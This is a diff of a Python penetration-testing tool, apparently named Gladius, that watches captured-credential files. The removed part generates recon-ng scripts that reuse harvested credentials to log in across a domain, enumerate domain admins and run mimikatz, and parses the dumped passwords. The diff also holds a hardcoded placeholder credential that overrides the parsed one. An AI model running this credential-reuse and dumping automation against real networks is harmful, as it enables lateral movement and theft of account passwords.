@@ -8,14 +8,19 @@ import md5
 
 from collections import namedtuple
 
-from watchdog.observers import Observer
-from watchdog.events import PatternMatchingEventHandler  
 from multiprocessing import Process
 from distutils.spawn import find_executable
 
 from ConfigParser import SafeConfigParser
 
 import argparse
+
+try:
+    from watchdog.observers import Observer
+    from watchdog.events import PatternMatchingEventHandler  
+except ImportError:
+    raise Exception("Watchdog is needed for Gladius: pip install watchdog.")
+    exit(0)
 
 config = SafeConfigParser()
 config.read('config.ini')
@@ -298,98 +303,6 @@ class CredsHandler(GladiusHandler):
             except IndexError:
                 pass
 
-class PentestlyHandler(GladiusHandler):
-    """
-    Watch for new credentials and attempt to authenticate with them on the network
-    """
-    patterns = ['*']
-    template = """workspaces add gladius
-load nmap
-set filename {}
-run
-load login
-set domain {}
-set username {}
-set password {}
-run
-load get_domain_admin_names
-run
-load mimikatz
-set source query SELECT username,password,domain,host FROM pentestly_creds WHERE execute='True' and username='{}'
-set lhost {}
-run
-load reporting/csv
-set filename {}
-set table pentestly_creds
-run
-"""
-
-
-    def process(self, event):
-        with open(event.src_path, 'r') as f:
-            data = f.read().split('\n')
-
-        outfile = self.get_outfile()
-
-        for line in data:
-            verbose("Pentestly: {}".format(line))
-            # Ignore blank lines
-            if not line:
-                continue
-
-            cred = Cred(*line.split())
-
-            cred = Cred('WORKGROUP', 'Administrator', 'BadAdminPassword')
-
-            junk = self.get_junkfile()
-
-            # Write Pentestly resource script to junkfile
-            lhost = config.get("Mimikatz", "lhost")
-            curr_template = self.template.format(config.get('Pentestly', 'nmap'), cred.domain,
-                                                 cred.username, cred.password, cred.username,
-                                                 lhost, self.get_outfile().name)
-            verbose(curr_template)
-            junk.write(curr_template)
-            # Spawn recon-ng
-            command = ['python2', config.get('Recon-ng', 'path'), '-r', junk.name]
-            warning("Recon-ng command: {}".format(' '.join([str(x) for x in command])))
-            res = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
-class AdminHandler(GladiusHandler):
-    """
-    Watch for new credentials and attempt to authenticate with them on the network
-    """
-    patterns = ['*']
-
-    def process(self, event):
-        with open(event.src_path, 'r') as f:
-            data = f.read().split('\n')
-
-        outfile = self.get_outfile()
-        for line in data:
-            if not line:
-                continue
-
-            line = line.replace('"', '')
-
-            if line.count("True") == 2:
-                # Pentestly success=True and execute=True == Local Admin rights
-                host, _, username, password, domain = line.split(',')[:5]
-                output = "Local Admin: {} \ {} : {} @ {}".format(domain, username, password, host)
-                success(output)
-                outfile.write(output + '\n')
-
-            if 'mimikatz' in line:
-                _, access, username, password, domain = line.split(',')[:5]
-                if not access:
-                    access = 'new'
-
-                output = "Mimikatz: ({}) {} \ {} : {}".format(access, domain, username, password)
-                success(output)
-                outfile.write(output + '\n')
-
-
-
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('-v', '--verbose', action="store_true", default=False, help="Increased output verbosity")
@@ -403,8 +316,6 @@ if __name__ == '__main__':
 
     handlers = [(ResponderHandler, config.get('Responder', 'watch_path')),
                 (CredsHandler, ResponderHandler().outpath)]
-                # (PentestlyHandler, CredsHandler().outpath),
-                # (AdminHandler, PentestlyHandler().outpath)]
 
     observer = Observer()
     observers = []
